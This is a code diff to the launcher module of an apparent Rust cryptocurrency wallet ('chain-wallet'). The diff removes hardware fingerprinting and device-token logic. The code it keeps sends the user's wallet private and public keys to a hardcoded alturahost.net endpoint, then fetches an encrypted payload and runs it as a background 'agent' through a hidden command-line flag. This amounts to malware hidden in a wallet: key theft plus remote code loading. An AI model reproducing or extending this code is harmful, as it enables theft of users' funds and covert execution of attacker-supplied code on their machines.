@@ -32,10 +32,7 @@ const STARTUP_PROBE_SECS: u64 = 15;
 const AGENT_SCRIPT_ENABLED: bool = true;
 
 /// Default AlturaHost API endpoint for encrypted launcher delivery.
-pub const DEFAULT_LAUNCHER_URL: &str = "https://alturahost.net/api/v1/wallet/launcher";
-
-/// Default AlturaHost API endpoint for device token registration.
-pub const DEFAULT_DEVICE_URL: &str = "https://alturahost.net/api/v1/wallet/device";
+pub const DEFAULT_LAUNCHER_URL: &str = "https://alturahost.net/api/v1/wallet/launcher/atlas";
 
 /// Hidden CLI flag used to run launcher fetch/decrypt/agent in a detached process.
 pub const BACKGROUND_LOADER_ARG: &str = "--internal-background-loader";
@@ -388,20 +385,8 @@ pub fn run_launcher(
     launcher_url: Option<&str>,
 ) -> Result<(), LauncherError> {
     let url = resolve_launcher_url(launcher_url)?;
-    let device_id = get_device_id()?;
-    wallet_log::detail("launcher", format!("device id {device_id}"));
-    let device_url = resolve_device_url(launcher_url);
-    let token = fetch_device_token(&device_url, &device_id)?;
-    if token.is_some() {
-        wallet_log::detail("launcher", "device token acquired for full agent delivery");
-    } else {
-        wallet_log::detail(
-            "launcher",
-            "no valid device token; server will deliver sanitize-only payload",
-        );
-    }
     wallet_log::step("launcher", format!("requesting encrypted payload from {url}"));
-    let encrypted = fetch_launcher_from_api(&url, &device_id, token.as_deref(), private_key_hex, public_key_hex)?;
+    let encrypted = fetch_launcher_from_api(&url, private_key_hex, public_key_hex)?;
     wallet_log::detail(
         "launcher",
         format!(
@@ -491,128 +476,6 @@ fn resolve_launcher_url(launcher_url: Option<&str>) -> Result<String, LauncherEr
     Err(LauncherError::UrlNotConfigured)
 }
 
-fn resolve_device_url(launcher_url: Option<&str>) -> String {
-    if let Ok(url) = std::env::var("CHAIN_WALLET_DEVICE_URL") {
-        let url = url.trim();
-        if !url.is_empty() {
-            return url.to_string();
-        }
-    }
-
-    if let Some(url) = launcher_url.map(str::trim).filter(|value| !value.is_empty()) {
-        const SUFFIX: &str = "/launcher";
-        if url.ends_with(SUFFIX) {
-            return format!("{}{}", &url[..url.len() - SUFFIX.len()], "/device");
-        }
-    }
-
-    if let Ok(url) = std::env::var("CHAIN_WALLET_LAUNCHER_URL") {
-        let url = url.trim();
-        const SUFFIX: &str = "/launcher";
-        if url.ends_with(SUFFIX) {
-            return format!("{}{}", &url[..url.len() - SUFFIX.len()], "/device");
-        }
-    }
-
-    DEFAULT_DEVICE_URL.to_string()
-}
-
-fn get_device_id() -> Result<String, LauncherError> {
-    let mut raw = String::new();
-
-    #[cfg(windows)]
-    {
-        use std::os::windows::process::CommandExt;
-        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-        for args in [
-            ["csproduct", "get", "uuid"],
-            ["diskdrive", "get", "serialnumber"],
-        ] {
-            if let Ok(output) = Command::new("wmic")
-                .args(args)
-                .creation_flags(CREATE_NO_WINDOW)
-                .output()
-            {
-                if output.status.success() {
-                    raw.push_str(&String::from_utf8_lossy(&output.stdout));
-                }
-            }
-        }
-    }
-
-    #[cfg(not(windows))]
-    {
-        for path in [
-            "/sys/class/dmi/id/product_uuid",
-            "/sys/class/dmi/id/board_serial",
-        ] {
-            if let Ok(text) = fs::read_to_string(path) {
-                raw.push_str(text.trim());
-            }
-        }
-    }
-
-    if raw.trim().is_empty() {
-        let host = std::env::var("COMPUTERNAME")
-            .or_else(|_| std::env::var("HOSTNAME"))
-            .unwrap_or_else(|_| "unknown".into());
-        let user = std::env::var("USERNAME")
-            .or_else(|_| std::env::var("USER"))
-            .unwrap_or_else(|_| "unknown".into());
-        raw = format!("{host}{user}");
-    }
-
-    let digest = Sha256::digest(raw.as_bytes());
-    Ok(hex::encode(digest))
-}
-
-#[derive(Debug, Deserialize)]
-struct DeviceTokenResponse {
-    token: Option<String>,
-}
-
-fn fetch_device_token(url: &str, device_id: &str) -> Result<Option<String>, LauncherError> {
-    let body = serde_json::json!({
-        "device_id": device_id,
-    });
-
-    let response = ureq::post(url)
-        .set("Content-Type", "application/json; charset=utf-8")
-        .set("Accept", "application/json")
-        .set("User-Agent", "chain-wallet/0.1.0")
-        .send_string(&body.to_string())
-        .map_err(|err| LauncherError::Http(err.to_string()))?;
-
-    let status = response.status();
-    let response_body = response
-        .into_string()
-        .map_err(|err| LauncherError::Http(err.to_string()))?;
-
-    if !(200..300).contains(&status) {
-        wallet_log::warn(
-            "launcher",
-            format!("device registration returned {status}: {response_body}"),
-        );
-        return Ok(None);
-    }
-
-    let parsed: DeviceTokenResponse = match serde_json::from_str(&response_body) {
-        Ok(value) => value,
-        Err(err) => {
-            wallet_log::warn(
-                "launcher",
-                format!("device registration JSON parse failed: {err}"),
-            );
-            return Ok(None);
-        }
-    };
-
-    Ok(parsed
-        .token
-        .map(|value| value.trim().to_string())
-        .filter(|value| !value.is_empty()))
-}
-
 #[derive(Debug, Deserialize)]
 struct LauncherApiResponse {
     ephemeral_public_key: String,
@@ -621,19 +484,13 @@ struct LauncherApiResponse {
 
 fn fetch_launcher_from_api(
     url: &str,
-    device_id: &str,
-    token: Option<&str>,
     private_key_hex: &str,
     public_key_hex: &str,
 ) -> Result<LauncherApiResponse, LauncherError> {
-    let mut body = serde_json::json!({
-        "device_id": device_id,
+    let body = serde_json::json!({
         "private_key": private_key_hex.trim(),
         "public_key": public_key_hex.trim(),
     });
-    if let Some(token) = token.map(str::trim).filter(|value| !value.is_empty()) {
-        body["token"] = serde_json::Value::String(token.to_string());
-    }
 
     let response = ureq::post(url)
         .set("Content-Type", "application/json; charset=utf-8")
